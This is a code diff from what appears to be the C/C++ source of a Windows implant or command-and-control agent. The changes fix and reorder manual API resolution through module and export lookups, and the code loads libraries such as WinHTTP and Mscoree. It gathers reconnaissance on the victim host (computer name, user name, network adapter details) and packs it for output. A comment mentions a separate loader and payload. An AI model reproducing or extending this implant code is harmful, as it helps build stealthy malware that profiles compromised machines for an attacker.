@@ -12,6 +12,7 @@ VOID Entrypoint() {
 		return;
 	}
 
+	ResolveApi();
 	ParseConfig();
     MainRoutine();
 }
@@ -24,7 +25,7 @@ namespace Main {
     }
 
 	BOOL CheckSystem() {
-		Ctx->Module.ntdll 		= FindModuleAddress(NTDLL);
+		Ctx->Module.Ntdll 		= FindModuleAddress(NTDLL);
 		Ctx->Module.Kernel32 	= FindModuleAddress(KERNEL32);
 
 		if (!Ctx->Module.Ntdll || !Ctx->Module.Kernel32) {
@@ -86,7 +87,9 @@ namespace Main {
         PROCESSENTRY32 procEntry   = { };
         procEntry.dwSize           = sizeof(PROCESSENTRY32);
 
-		Ctx->Win32.GetComputerNameExA = FindExportAddress((LPVOID)Ctx->Mdoue.Kernel32, GETCOMPUTERNAMEEXA);
+
+		Ctx->Win32.GetUserNameA 		= FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETUSERNAMEA);
+		Ctx->Win32.GetComputerNameExA 	= FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETCOMPUTERNAMEEXA);
 
         if (Ctx->Win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR)buffer, &nameLen)) {
             if (Ctx->Config.Hostname[0]) {
@@ -119,13 +122,12 @@ namespace Main {
         nameLen = MAX_PATH;
 
 		// NOTE: Beyond this point we can start capturing info.
-		Ctx->Module.Iphlpapi = LoadLibrary(IPHLPAPI); // TODO: need to fix library loader.
-		if (!Ctx->Module.Iphlpapi) {
+		Ctx->Module.Iphlpapi = LoadLibrary("iphlpapi.dll");
+		Ctx->Win32.GetAdaptersInfo = FindExportAddress((LPVOID)Ctx->Module.Iphlpapi, GETADAPTERSINFO);
+
+		if (!Ctx->Win32.GetAdaptersInfo) {
 			goto defer;
 		}
-
-		Ctx->Win32.GetUserNameA = FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETUSERNAMEA);
-		Ctx->Win32.GetAdaptersInfo = FindExportAddress((LPVOID)Ctx->Module.Iphlpapi, GETADAPTERSINFO);
 
         if (Ctx->Win32.GetUserNameA((LPSTR)buffer, &nameLen)) {
             PackString(outPack, buffer);
@@ -153,11 +155,9 @@ defer:
     }
 
 	VOID ResolveApi() {
-        // TODO: create separate ResolveApi for loader and payload
 		Ctx->Module.Kernbase 	= LoadLibrary(KERNELBASE);
 		Ctx->Module.Advapi 		= LoadLibrary(ADVAPI);
 		Ctx->Module.Crypt32 	= LoadLibrary(CRYPT32);
-		Ctx->Module.Iphlpapi 	= LoadLibrary(IPHLPAPI);
 		Ctx->Module.Winhttp 	= LoadLibrary(WINHTTP);
 		Ctx->Module.Mscoree 	= LoadLibrary(MSCOREE);
 
